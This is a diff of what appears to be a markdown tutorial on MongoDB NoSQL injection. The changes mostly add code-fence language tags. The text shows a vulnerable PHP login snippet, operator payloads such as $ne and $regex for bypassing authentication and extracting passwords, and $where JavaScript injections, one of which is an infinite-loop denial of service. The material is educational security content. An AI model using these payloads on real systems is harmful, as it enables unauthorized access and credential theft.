@@ -37,7 +37,7 @@ Now most of the websites are using ```NoSQL database```,its difficult to find ``
 To understand how a ```NoSQL``` query is constructed and how it is vulnerable to an `injection` attack, we will focus on the most popular ```NoSQL database```: `MongoDB`, and we will access it using `PHP`. Here is a simple example of a code snippet that accesses a `MongoDB` for authentication purposes.
 
 * Vulnerable code
-```
+```PHP
 $username = $_POST['username'];
 $password = $_POST['password'];
 $connection = new MongoDB\Client('mongodb://localhost:27017');
@@ -56,7 +56,7 @@ As you can see, in this example, `username` and `password` used for authenticati
 
 To perform a successful `MongoDB injection`, it is enough if the attacker supplies the following `malicious` input data as a POST request:
 
-```
+```JSON
 username[$eq]=admin&password[$ne]=foo
 ```
 * NOTE: Mongodb uses NoSQL database 
@@ -70,23 +70,30 @@ More operators can be used in a similar fashion, for example `[$lt]` and `[$gt]`
 `MongoDB` queries support a commonly used operator `$where`, which introduces possibilities of serious `NoSQL attacks` that include JavaScript objects.
 
 For example, a developer might want to use the `$where` operator in the following fashion to access a record for a particular user:
-```
+
+```SQL
 $query = array('$where' => 'this.name === \''.$name.'\'');
 ```
 
 In this situation, the attacker may provide the following empty string comparison trick as $name:
 
-```'; return '' == '```
+```SQL
+'; return '' == '
+```
 
 As a result, the query will become:
 
-```"$where": "this.name === ''; return '```
+```JSON
+"$where": "this.name === ''; return '
+```
 
 And the attacker will receive the entire list of users.
 
 Since the $where operator is actually evaluated as JavaScript code, the attacker could also pass a malicious string that includes arbitrary JavaScript, for example:
 
-```'; while(true){}'```
+```JSON
+'; while(true){}'
+```
 
 ## How to automate NoSQL injection ?
 
@@ -103,7 +110,8 @@ But `NoSQLi scanner` is only available for `Burp suit pro users` so if you use b
 ## Payloads
 
 **Authentication bypass**
-```
+
+```JSON
 in DATA
 username[$ne]=toto&password[$ne]=toto
 login[$regex]=a.*&pass[$ne]=lol
@@ -119,13 +127,13 @@ in JSON
 ```
 
 **Extract length information**
-```
+```JSON
 username[$ne]=toto&password[$regex]=.{1}
 username[$ne]=toto&password[$regex]=.{3}
 ```
 
 **Extract data information**
-```
+```JSON
 in URL
 username[$ne]=toto&password[$regex]=m.{2}
 username[$ne]=toto&password[$regex]=md.{1}
@@ -141,7 +149,7 @@ in JSON
 
 ```
 **These are some payloads you can use to identify NoSQL injection vulnerability:**
-```
+```JSON
 true, $where: '1 == 1'
 , $where: '1 == 1'
 $where: '1 == 1'
